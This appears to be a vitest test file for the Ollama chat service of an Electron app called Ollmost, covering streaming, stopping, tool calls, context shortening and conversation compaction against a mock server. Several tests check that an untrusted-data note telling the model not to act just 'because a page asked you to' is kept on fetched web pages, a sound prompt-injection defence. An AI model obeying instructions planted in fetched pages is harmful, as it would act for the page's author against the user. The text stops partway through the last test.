import { mkdtempSync, realpathSync, writeFileSync } from 'node:fs'
import type { ServerResponse } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import type { ChatEvent, MessageStats, ToolEvent } from '@shared/types'
import type { RoundsInput } from '../src/main/chat/rounds'
import type { ToolContext, ToolProvider } from '../src/main/chat/tools'
import type { Workspace } from '../src/main/runner/workspace'
import { line, type MockOllama, startMockOllama, streamChunks } from './ollamaMock'

// Everything above the Electron line is real: SQLite (in memory), settings, prompt assembly, the
// Ollama client and the tool loop. Only Electron itself is faked, and Ollama is a local mock server.
const events = vi.hoisted(() => {
  process.env.OLLMOST_WEB_URL = 'http://127.0.0.1:1' // replaced once the mock is listening
  return [] as ChatEvent[]
})
vi.mock('electron', () => ({
  BrowserWindow: { getAllWindows: () => [{ webContents: { send: (_channel: string, e: ChatEvent) => events.push(e) } }] },
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (s: string) => Buffer.from(s),
    decryptString: (b: Buffer) => b.toString()
  },
  shell: {},
  app: { getPath: () => '' },
  nativeImage: {}
}))

// web.ts reads its base URL at import, so the mock must be listening before the service loads.
const ollama: MockOllama = await startMockOllama()
process.env.OLLMOST_WEB_URL = ollama.url

const { all, openDatabase } = await import('../src/main/db/index')
const { updateSettings, setApiKey, getSettings } = await import('../src/main/settings')
const service = await import('../src/main/chat/service')
const { listTraces } = await import('../src/main/debug/traces')
const {
  deleteConversation,
  getConversation,
  getMessage,
  insertAttachment,
  insertMessage,
  createConversation,
  search,
  updateConversation,
  updateMessage
} = await import('../src/main/db/conversations')
const { registerToolProvider } = await import('../src/main/chat/tools')
const { runRounds } = await import('../src/main/chat/rounds')
const { getModelInfo } = await import('../src/main/ollama/models')
const { conversationUsage, insertUsageEvent } = await import('../src/main/db/usage')
const approvals = await import('../src/main/chat/approvals')
const mcpConfig = await import('../src/main/mcp/config')
const mcpManager = await import('../src/main/mcp/manager')
const { paths } = await import('../src/main/paths')
paths.data = mkdtempSync(join(tmpdir(), 'ollmost-service-data-'))

type ChatHandler = (body: Record<string, unknown>, res: ServerResponse, call: number) => unknown
let chat: ChatHandler
let web: (path: string, res: ServerResponse) => unknown
let chatCalls: Array<Record<string, unknown>>
let titleCalls: Array<Record<string, unknown>>

beforeAll(() => {
  openDatabase(':memory:')
  updateSettings({ connection: { mode: 'local', host: ollama.url }, skills: { autoLoad: false }, web: { enabled: true } })
  ollama.handler = (req, res) => {
    if (req.url === '/api/show')
      return res.writeHead(200).end(JSON.stringify({ capabilities: ['completion', 'tools'], model_info: { 'llama.context_length': 8192 } }))
    // Titles are generated in the background after a reply; answer them apart from the scripted chat.
    if (req.url === '/api/chat' && req.json.stream === false) {
      titleCalls.push(req.json)
      return res.writeHead(200).end(JSON.stringify({ message: { role: 'assistant', content: 'A title' }, done: true }))
    }
    if (req.url === '/api/chat') {
      chatCalls.push(req.json)
      return chat(req.json, res, chatCalls.length)
    }
    return web(req.url ?? '', res)
  }
})
afterAll(() => ollama.close())
beforeEach(() => {
  events.length = 0
  chatCalls = []
  titleCalls = []
  setApiKey(null)
  web = (_p, res) => res.writeHead(404).end()
})

const reply =
  (text: string): ChatHandler =>
  (_b, res) =>
    streamChunks(res, [
      line({ message: { role: 'assistant', content: text }, done: false }),
      line({ done: true, done_reason: 'stop', prompt_eval_count: 10, eval_count: 3 })
    ]).then(() => res.end())

const toolCall = (name: string, args: Record<string, unknown>) =>
  line({ message: { role: 'assistant', content: '', tool_calls: [{ function: { name, arguments: args } }] }, done: false }) +
  line({ done: true })

/** A send() body for a follow-up in an existing chat. */
const sendBody = (conversationId: string) => ({
  conversationId,
  projectId: null,
  content: '',
  attachmentIds: [],
  model: 'llama3.2',
  think: null,
  skills: [],
  toolSources: []
})

function start(content = 'hello') {
  return service.send({
    conversationId: null,
    projectId: null,
    content,
    attachmentIds: [],
    model: 'llama3.2',
    think: null,
    skills: [],
    toolSources: []
  })
}

function waitFor<T>(check: () => T | undefined | false, ms = 5000): Promise<T> {
  return new Promise((resolve, reject) => {
    const t0 = Date.now()
    const tick = () => {
      const v = check()
      if (v) return resolve(v)
      if (Date.now() - t0 > ms) return reject(new Error('timed out waiting'))
      setTimeout(tick, 10)
    }
    tick()
  })
}

const doneEvent = (conversationId: string) =>
  waitFor(() => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === conversationId))

describe('reply loop', () => {
  it('streams a reply and saves it with stats', async () => {
    chat = reply('Hi there')
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Hi there')
    expect(done.message.stats).toMatchObject({ promptTokens: 10, completionTokens: 3, doneReason: 'stop' })
    expect(chatCalls[0]).toMatchObject({ model: 'llama3.2', options: { num_ctx: 8192 } })
    // The title request uses the same num_ctx, so Ollama doesn't reload the local model for it.
    await waitFor(() => titleCalls.length > 0)
    expect(titleCalls[0]).toMatchObject({ options: { num_ctx: 8192 } })
  })

  it('records when a reply was cut off by the length limit', async () => {
    chat = (_b, res) =>
      streamChunks(res, [
        line({ message: { role: 'assistant', content: 'The list goes on: one, two, thr' }, done: false }),
        line({ done: true, done_reason: 'length', eval_count: 4096 })
      ]).then(() => res.end())
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.stats?.doneReason).toBe('length')
    expect(done.message.error).toBeNull()
  })

  it("sends a chat's own instructions with its replies", async () => {
    chat = reply('Arr.')
    const r = start()
    await doneEvent(r.conversation.id)
    updateConversation(r.conversation.id, { instructions: 'Answer like a pirate.' })
    events.length = 0
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'hi again',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    const system = (chatCalls.at(-1)!.messages as Array<{ role: string; content: string }>)[0]
    expect(system.content).toContain('Answer like a pirate.')
  })

  it('saves a failed stream with its partial text and an error', async () => {
    chat = (_b, res) =>
      streamChunks(res, [line({ message: { role: 'assistant', content: 'Half an ans' }, done: false })]).then(() => res.end())
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Half an ans')
    expect(done.message.error).toMatch(/dropped before the reply finished/)
  })

  it('checkpoints a long reply to the database while it streams', async () => {
    let release!: () => void
    const gate = new Promise<void>((r) => (release = r))
    chat = async (_b, res) => {
      await streamChunks(res, [
        line({ message: { role: 'assistant', content: '', thinking: 'early thought' }, done: false }),
        line({ message: { role: 'assistant', content: 'early words' }, done: false })
      ])
      await new Promise((r) => setTimeout(r, 1700))
      res.write(line({ message: { role: 'assistant', content: '!' }, done: false })) // triggers the checkpoint
      await gate
      res.end(line({ done: true }))
    }
    const r = start()
    const saved = await waitFor(() => getMessage(r.assistantMessageId)?.content === 'early words!')
    expect(saved).toBe(true)
    // The checkpoint carries the round's thinking so far, placed, in case it's the last save.
    expect(getMessage(r.assistantMessageId)?.thinkingSegments).toEqual([{ text: 'early thought', at: 0, index: 0, ms: expect.any(Number) }])
    release()
    await doneEvent(r.conversation.id)
  })

  it('stop() resolves only after the partial reply is saved', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'partial' }, done: false })]) // then hangs
    const r = start()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true }) // as deleting the chat does
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.content).toBe('partial')
    expect(saved.error).toBeNull()
    expect(saved.stats).not.toBeNull()
    // The chat can now be deleted without the reply writing to it afterwards.
    deleteConversation(r.conversation.id)
    expect(service.isReplying()).toBe(false)
    // A stop for a delete (or a quit) doesn't start a title request.
    await new Promise((r) => setTimeout(r, 50))
    expect(titleCalls).toHaveLength(0)
  })

  it('stop() keeps the thinking of the round it stopped in', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: '', thinking: 'half a thought' }, done: false })]) // then hangs
    const r = start()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true })
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.thinking).toBe('half a thought')
    expect(saved.thinkingSegments).toEqual([{ text: 'half a thought', at: 0, index: 0, ms: expect.any(Number) }])
  })

  it('still titles a new chat whose first reply was stopped with Stop', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'partial' }, done: false })])
    const r = start()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id)
    await waitFor(() => events.some((e) => e.type === 'title' && e.conversationId === r.conversation.id))
    expect(titleCalls).toHaveLength(1)
  })

  it('keeps an overlapping reply stoppable after the earlier one finishes', async () => {
    chat = reply('first')
    const r = start()
    await doneEvent(r.conversation.id)
    events.length = 0
    // regenerate() awaits file cleanup before registering its reply; a send() landing in that gap
    // registers its own reply first. The regenerated reply streams and then hangs.
    chat = (_b, res, n) =>
      n === 2
        ? reply('sent reply')(_b, res, n)
        : streamChunks(res, [line({ message: { role: 'assistant', content: 'regenerated' }, done: false })])
    const regen = service.regenerate(r.conversation.id, { model: 'llama3.2', think: null })
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'again',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const second = await regen
    await doneEvent(r.conversation.id) // the send's reply finished
    expect(service.isReplying()).toBe(true) // the regenerated reply is still tracked…
    await service.stop(r.conversation.id) // …so stop() waits for it and it gets saved
    expect(getMessage(second.assistantMessageId)?.stats).not.toBeNull()
    expect(service.isReplying()).toBe(false)
  })

  it('stops promptly during a slow web request and marks the call stopped', async () => {
    setApiKey('test-key')
    chat = (_b, res) => void res.writeHead(200).end(toolCall('web_fetch', { url: 'https://example.com' }))
    web = () => undefined // web_fetch never answers
    const r = start('read example.com')
    await waitFor(() => events.some((e) => e.type === 'tool' && e.event.pending))
    const t0 = Date.now()
    await service.stop(r.conversation.id)
    expect(Date.now() - t0).toBeLessThan(1000)
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.toolEvents).toEqual([expect.objectContaining({ tool: 'web_fetch', pending: false, ok: false })])
    expect(saved.error).toBeNull()
    // The debugger shows the cancelled call as stopped, not forever running.
    const traces = listTraces(r.conversation.id)
    expect(traces.find((t) => t.kind === 'tool')?.status).toBe('aborted')
    expect(traces.every((t) => t.status !== 'running')).toBe(true)
  })

  it('withdraws tools after the model only calls tools Ollmost lacks', async () => {
    chat = (_b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('python', { code: '1+1' })) : reply('2')(_b, res, n))
    const r = start('what is 1+1')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('2')
    expect(chatCalls).toHaveLength(2)
    expect(chatCalls[1].tools).toBeUndefined()
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'python', ok: false, unknown: true })
  })

  it('records where in the reply each tool call happened, with a preview of its result', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) + toolCall('web_search', { query: 'ollmost' })
            )
        : reply('Found it.')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Let me check.\n\nFound it.')
    const [event] = done.message.toolEvents
    expect(event).toMatchObject({ tool: 'web_search', ok: true, at: 'Let me check.'.length })
    expect(event.preview).toContain('https://k.io')
    expect(event.unknown).toBeUndefined()
    // The live events carry the position too, while pending and once finished.
    const live = events.filter(
      (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id
    )
    expect(live.map((e) => [e.event.pending ?? false, e.event.at])).toEqual([
      [true, 13],
      [false, 13]
    ])
  })

  it('lets a running tool replace its pending event, and tells it its index', async () => {
    const seen: number[] = []
    const slow: ToolProvider = {
      id: 'slow-test',
      tools: () => [{ type: 'function', function: { name: 'slow', description: 'slow', parameters: { type: 'object', properties: {} } } }],
      pending: () => ({ tool: 'slow', args: {}, ok: true, pending: true, summary: 'starting' }),
      approval: () => 'auto',
      run: async (_call, ctx) => {
        seen.push(ctx.callIndex!)
        ctx.progress?.({ tool: 'slow', args: {}, ok: true, summary: 'halfway' })
        return { content: 'slow done', event: { tool: 'slow', args: {}, ok: true, summary: 'finished' } }
      }
    }
    const off = registerToolProvider(slow)
    try {
      chat = (_b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('slow', {})) : reply('ok')(_b, res, n))
      const r = start('go slow')
      const done = await doneEvent(r.conversation.id)
      expect(seen).toEqual([0])
      const live = events.filter(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id
      )
      expect(live.map((e) => [e.event.summary, e.event.pending ?? false])).toEqual([
        ['starting', true],
        ['halfway', true],
        ['finished', false]
      ])
      expect(done.message.toolEvents[0]).toMatchObject({ summary: 'finished', at: 0 })
    } finally {
      off()
    }
  })

  it('ignores a report from a tool whose call has already finished', async () => {
    let late: ((event: ToolEvent) => void) | undefined
    const quick: ToolProvider = {
      id: 'late-test',
      tools: () => [
        { type: 'function', function: { name: 'quick', description: 'quick', parameters: { type: 'object', properties: {} } } }
      ],
      pending: () => ({ tool: 'quick', args: {}, ok: true, pending: true, summary: 'starting' }),
      approval: () => 'auto',
      run: async (_call, ctx) => {
        late = ctx.progress
        return { content: 'quick done', event: { tool: 'quick', args: {}, ok: true, summary: 'finished' } }
      }
    }
    const off = registerToolProvider(quick)
    try {
      chat = (b, res, n) => {
        if (n === 1) return void res.writeHead(200).end(toolCall('quick', {}))
        // The call finished before this request was made: a report now comes too late to count.
        late?.({ tool: 'quick', args: {}, ok: true, summary: 'too late' })
        return reply('ok')(b, res, n)
      }
      const r = start('go quick')
      const done = await doneEvent(r.conversation.id)
      expect(done.message.toolEvents[0]).toMatchObject({ tool: 'quick', ok: true, summary: 'finished' })
      expect(events.some((e) => e.type === 'tool' && e.conversationId === r.conversation.id && e.event.summary === 'too late')).toBe(false)
    } finally {
      off()
    }
  })

  it('keeps each round’s thinking with where the round began, live and saved', async () => {
    setApiKey('test-key')
    const thought = (text: string) => line({ message: { role: 'assistant', content: '', thinking: text }, done: false })
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              thought('Plan: search.') +
                line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) +
                toolCall('web_search', { query: 'ollmost' })
            )
        : n === 2
          ? void res
              .writeHead(200)
              .end(
                thought('Got it.') +
                  line({ message: { role: 'assistant', content: 'Found it.' }, done: false }) +
                  line({ done: true, done_reason: 'stop', prompt_eval_count: 10, eval_count: 3 })
              )
          : reply('Search chat')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    // The joined text stays as it was, for older readers; the segments say where each round's thinking belongs.
    expect(done.message.thinking).toBe('Plan: search.Got it.')
    expect(done.message.thinkingSegments).toEqual([
      { text: 'Plan: search.', at: 0, index: 0, ms: expect.any(Number) },
      { text: 'Got it.', at: 'Let me check.'.length, index: 1, ms: expect.any(Number) }
    ])
    const thinkingDeltas = events.filter(
      (e): e is Extract<ChatEvent, { type: 'delta' }> => e.type === 'delta' && e.conversationId === r.conversation.id && !!e.thinking
    )
    expect(thinkingDeltas.map((e) => [e.thinking, e.round])).toEqual([
      ['Plan: search.', { at: 0, index: 0 }],
      ['Got it.', { at: 13, index: 1 }]
    ])
    const { listMessages } = await import('../src/main/db/conversations')
    expect(listMessages(r.conversation.id).at(-1)?.thinkingSegments).toEqual(done.message.thinkingSegments)
  })

  it('reports the chat’s usage as each round ends, so the chip moves during a long reply', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) + toolCall('web_search', { query: 'ollmost' })
            )
        : reply('Found it.')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    await waitFor(() => events.some((e) => e.type === 'title' && e.conversationId === r.conversation.id))
    const mine = events.filter((e) => e.conversationId === r.conversation.id)
    const types = mine.map((e) => e.type)
    // One usage event as the first round closes, after its text and before the second round's (the done carries the
    // last round's), then one after the title request.
    const before = types.slice(0, types.indexOf('done'))
    expect(before.filter((x) => x === 'usage')).toHaveLength(1)
    expect(before.indexOf('usage')).toBeGreaterThan(before.indexOf('delta'))
    expect(before.lastIndexOf('delta')).toBeGreaterThan(before.indexOf('usage'))
    const between = mine[types.indexOf('usage')] as Extract<ChatEvent, { type: 'usage' }>
    expect(between.usage.byModel.map((m) => m.requests)).toEqual([1])
    expect(done.usage.byModel.map((m) => m.requests)).toEqual([2])
    const after = mine.slice(types.indexOf('done')).filter((e): e is Extract<ChatEvent, { type: 'usage' }> => e.type === 'usage')
    expect(after.map((e) => e.usage.byModel.map((m) => m.requests))).toEqual([[3]])
  })

  it('remembers earlier search results on the next turn', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('web_search', { query: 'ollmost news' }))
        : reply(n === 2 ? 'Two stories today.' : 'Opening it.')(b, res, n)
    web = (_p, res) =>
      res.writeHead(200).end(
        JSON.stringify({
          results: [
            { title: 'Ollmosts are back', url: 'https://a.example/ollmosts', content: 'x' },
            { title: 'Pottery prices', url: 'https://b.example/pots', content: 'y' }
          ]
        })
      )
    const r = start('what is in the news?')
    const first = await doneEvent(r.conversation.id)
    expect(first.message.toolEvents[0].record).toContain('2. Pottery prices — https://b.example/pots')
    events.length = 0
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'open the second one',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    const followUp = chatCalls[2].messages as Array<{ role: string; content: string; tool_calls?: unknown[] }>
    const replayed = followUp.find((m) => m.role === 'tool')
    expect(replayed?.content).toContain('https://b.example/pots')
    expect(followUp.find((m) => m.tool_calls)?.tool_calls).toEqual([
      { function: { name: 'web_search', arguments: { query: 'ollmost news' } } }
    ])
  })

  it('ends a tool-happy model with a tool-free final round', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      b.tools ? void res.writeHead(200).end(toolCall('web_search', { query: `q${n}` })) : reply('Final answer')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 't', url: 'https://t.io', content: 'c' }] }))
    const r = start('research this')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Final answer')
    expect(chatCalls.length).toBe(6)
    expect(chatCalls.at(-1)!.tools).toBeUndefined()
    // It was still calling tools, so the reply says it ran out of rounds (and offers Continue).
    expect(done.message.stats?.toolRoundLimit).toBe(6)
  })

  it('takes the round limit from the reply options', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      b.tools ? void res.writeHead(200).end(toolCall('web_search', { query: `q${n}` })) : reply('Stopped early')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] }))
    const r = service.send(
      {
        conversationId: null,
        projectId: null,
        content: 'dig deep',
        attachmentIds: [],
        model: 'llama3.2',
        think: null,
        skills: [],
        toolSources: []
      },
      { maxToolRounds: 3 }
    )
    const done = await doneEvent(r.conversation.id)
    expect(chatCalls.length).toBe(3)
    expect(chatCalls.at(-1)!.tools).toBeUndefined()
    expect(done.message.stats?.toolRoundLimit).toBe(3)
  })

  describe('context guard within a turn', () => {
    // The mock model has an 8,192-token window: requests may use 6,144 tokens (about 24K characters).
    const fetchRound = (b: Record<string, unknown>, res: ServerResponse, n: number, promptCount = 100) =>
      n <= 2
        ? void res.writeHead(200).end(
            line({
              message: {
                role: 'assistant',
                content: '',
                tool_calls: [{ function: { name: 'web_fetch', arguments: { url: `https://p${n}.io` } } }]
              },
              done: false
            }) + line({ done: true, prompt_eval_count: promptCount })
          )
        : reply('Compared.')(b, res, n)
    const toolMessages = (call: Record<string, unknown>) =>
      (call.messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    let page = 0
    const pages = (size: number) => (_p: string, res: ServerResponse) =>
      res.writeHead(200).end(JSON.stringify({ title: `Page ${++page}`, content: `${'x'.repeat(size)} MARK-${page}`, links: [] }))

    it('shortens the older results of this turn when the next request would overflow, keeping the newest whole', async () => {
      setApiKey('test-key')
      page = 0
      chat = (b, res, n) => fetchRound(b, res, n)
      web = pages(12_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      expect(done.message.content).toBe('Compared.')
      const [first, second] = toolMessages(chatCalls[2])
      expect(first.content).toMatch(/^\[Ollmost shortened this earlier web_fetch result .*It was: Page 1\./)
      expect(second.content).toContain('MARK-2')
      expect(done.message.stats?.shortenedToolResults).toBe(1)
      // The round that produced the newest result saw the older one whole.
      expect(toolMessages(chatCalls[1])[0].content).toContain('MARK-1')
    })

    it("shares the room between one round's results, since the newest round is never shortened", async () => {
      setApiKey('test-key')
      page = 0
      // Four big pages read at once: at the 24,000-character cap each, they'd be about four times the budget.
      const calls = [1, 2, 3, 4].map((i) => ({ function: { name: 'web_fetch', arguments: { url: `https://p${i}.io` } } }))
      chat = (b, res, n) =>
        n === 1
          ? void res
              .writeHead(200)
              .end(line({ message: { role: 'assistant', content: '', tool_calls: calls }, done: false }) + line({ done: true }))
          : reply('Read them all.')(b, res, n)
      web = pages(20_000)
      const done = await doneEvent(start('read these four pages').conversation.id)
      expect(done.message.content).toBe('Read them all.')
      const results = toolMessages(chatCalls[1])
      expect(results).toHaveLength(4)
      const total = results.reduce((n, m) => n + m.content.length, 0)
      expect(total).toBeLessThanOrEqual(6_144 * 4)
      // Each still gets its share, and the untrusted-data note after each page survives.
      for (const r of results) {
        expect(r.content.length).toBeGreaterThan(1_500)
        expect(r.content.endsWith('because a page asked you to.')).toBe(true)
      }
    })

    it("uses Ollama's own token count when it's higher than Ollmost's estimate", async () => {
      setApiKey('test-key')
      page = 0
      // Small pages, so Ollmost's estimate fits easily; but Ollama reports the second request at 6,000 tokens.
      chat = (b, res, n) => fetchRound(b, res, n, n === 2 ? 6_000 : 100)
      web = pages(2_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      const [first, second] = toolMessages(chatCalls[2])
      expect(first.content).toMatch(/^\[Ollmost shortened/)
      expect(second.content).toContain('MARK-2')
      expect(done.message.stats?.shortenedToolResults).toBe(1)
    })

    it('leaves results alone when they fit', async () => {
      setApiKey('test-key')
      page = 0
      chat = (b, res, n) => fetchRound(b, res, n)
      web = pages(2_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      expect(toolMessages(chatCalls[2]).map((m) => m.content.includes('MARK-'))).toEqual([true, true])
      expect(done.message.stats?.shortenedToolResults).toBeUndefined()
      expect(done.message.stats?.toolRoundLimit).toBeUndefined()
    })
  })

  it('never cuts the untrusted-data note off a huge page', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1 ? void res.writeHead(200).end(toolCall('web_fetch', { url: 'https://big.io' })) : reply('Read it.')(b, res, n)
    web = (_p, res) =>
      res.writeHead(200).end(
        JSON.stringify({
          title: 'Big',
          content: 'y'.repeat(80_000),
          links: Array.from({ length: 25 }, (_, i) => `https://big.io/${'z'.repeat(400)}/${i}`)
        })
      )
    await doneEvent(start('read big.io').conversation.id)
    const [result] = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(result.content.length).toBeLessThanOrEqual(24_000)
    expect(result.content).toContain('[… page truncated]')
    expect(result.content.endsWith('because a page asked you to.')).toBe(true)
  })
})

describe('/compact', () => {
  it('summarizes every message with the chat’s model and replays the summary instead of them', async () => {
    chat = reply('an answer')
    const r = start('first question')
    await doneEvent(r.conversation.id)
    for (const q of ['second', 'third', 'fourth', 'fifth', 'sixth']) {
      await waitFor(() => !service.isReplying())
      events.length = 0
      const next = service.send({ ...sendBody(r.conversation.id), content: q })
      await doneEvent(next.conversation.id)
    }
    await waitFor(() => !service.isReplying())
    // Twelve messages. The summary request is the one non-streaming call that isn't a title.
    const base = ollama.handler
    ollama.handler = (req, res) => {
      const body = req.json as { stream?: boolean; messages?: Array<{ content: string }> }
      if (req.url === '/api/chat' && body.stream === false && /compact/i.test(String(body.messages?.[0]?.content))) {
        compactCalls.push(req.json)
        return res.writeHead(200).end(
          JSON.stringify({
            message: { role: 'assistant', content: 'Six questions were asked and answered.' },
            done: true,
            prompt_eval_count: 50,
            eval_count: 8
          })
        )
      }
      return base!(req, res)
    }
    const compactCalls: Array<Record<string, unknown>> = []
    try {
      const c = await service.compact(r.conversation.id, { focus: 'keep the numbers', model: 'llama3.2' })
      expect(compactCalls).toHaveLength(1)
      const [instructions, summaryRequest] = (compactCalls[0].messages as Array<{ content: string }>).map((m) => m.content)
      expect(instructions).toContain('keep the numbers')
      expect(summaryRequest).toContain('first question')
      // Every message was summarized, the last turns too.
      const { listMessages } = await import('../src/main/db/conversations')
      const messages = listMessages(r.conversation.id)
      expect(c.compaction).toMatchObject({ summary: 'Six questions were asked and answered.', messages: 12, upTo: messages[11].createdAt })
      expect(summaryRequest).toContain('sixth')
      // The next reply replays the summary and only what followed.
      chatCalls = []
      events.length = 0
      await waitFor(() => !service.isReplying())
      const after = service.send({ ...sendBody(r.conversation.id), content: 'seventh' })
      await doneEvent(after.conversation.id)
      const sent = chatCalls[0].messages as Array<{ role: string; content: string }>
      expect(sent[0].content).toContain('<earlier_conversation messages="12">')
      expect(sent[0].content).toContain('Six questions were asked and answered.')
      expect(sent.slice(1).map((m) => m.content)).toEqual(['seventh'])
    } finally {
      ollama.handler = base
    }
  })

  /** A mock that answers every summary request from `answers` in turn, capturing each request. */
  const summarizer = (answers: string[], calls: Array<Record<string, unknown>>, gate?: Promise<void>) => {
    const base = ollama.handler
    ollama.handler = async (req, res) => {
      const body = req.json as { stream?: boolean; messages?: Array<{ content: string }> }
      if (req.url === '/api/chat' && body.stream === false && /compact/i.test(String(body.messages?.[0]?.content))) {
        calls.push(req.json)
        if (gate) await gate
        const content = answers[Math.min(calls.length, answers.length) - 1]
        return res
          .writeHead(200)
          .end(JSON.stringify({ message: { role: 'assistant', content }, done: true, prompt_eval_count: 50, eval_count: 8 }))
      }
      return base!(req, res)
    }
    return () => (ollama.handler = base)
  }

  const exchanges = async (conversationId: string, questions: string[]) => {
    for (const q of questions) {
      await waitFor(() => !service.isReplying())
      events.length = 0
      const next = service.send({ ...sendBody(conversationId), content: q })
      await doneEvent(next.conversation.id)
    }
    await waitFor(() => !service.isReplying())
  }

  it('summarizes in pieces when the older messages outgrow the model’s window, folding each summary into the next', async () => {
    // The mock model's window is 8192 tokens (~32k characters): seven 6,000-character messages won't fit at once.
    const long = 'word '.repeat(1200)
    chat = reply(long)
    const r = start(`first ${long}`)
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['second', 'third', 'fourth', 'fifth', 'sixth'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Summary one.', 'Summary two.', 'Summary three.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      expect(calls.length).toBeGreaterThan(1)
      const users = calls.map((call) => String((call.messages as Array<{ content: string }>)[1].content))
      expect(users[0]).toContain('first')
      expect(users[1]).toContain('Summary one.')
      expect(users.every((u) => /summarize/i.test(u.slice(-200)))).toBe(true)
      expect(c.compaction?.summary).toBe(calls.length === 2 ? 'Summary two.' : 'Summary three.')
      expect(c.compaction?.messages).toBe(12)
    } finally {
      restore()
    }
  })

  it('summarizes every message but a failed reply that saved nothing', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2'])
    // A failed reply saves with no content and is left out of the count.
    chat = (_b, res) => void res.writeHead(500).end('boom')
    await exchanges(r.conversation.id, ['q3'])
    chat = reply('an answer')
    await exchanges(r.conversation.id, ['q4'])
    // Filtered: q1 A1 q2 A2 q3 q4 A4, and all of them are summarized.
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Four questions.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      const { listMessages } = await import('../src/main/db/conversations')
      const messages = listMessages(r.conversation.id)
      expect(c.compaction).toMatchObject({ messages: 7, upTo: messages[7].createdAt })
      const transcript = String((calls[0].messages as Array<{ content: string }>)[1].content)
      expect(transcript).toContain('q1')
      expect(transcript).toContain('q2')
      expect(transcript).toContain('q4')
    } finally {
      restore()
    }
  })

  it('compacts again by folding the earlier summary in, and clears the summary when a covered message is edited', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4', 'q5', 'q6'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['First summary.', 'Second summary.'], calls)
    try {
      const first = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      expect(first.compaction?.messages).toBe(12)
      await exchanges(r.conversation.id, ['q7', 'q8'])
      const second = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
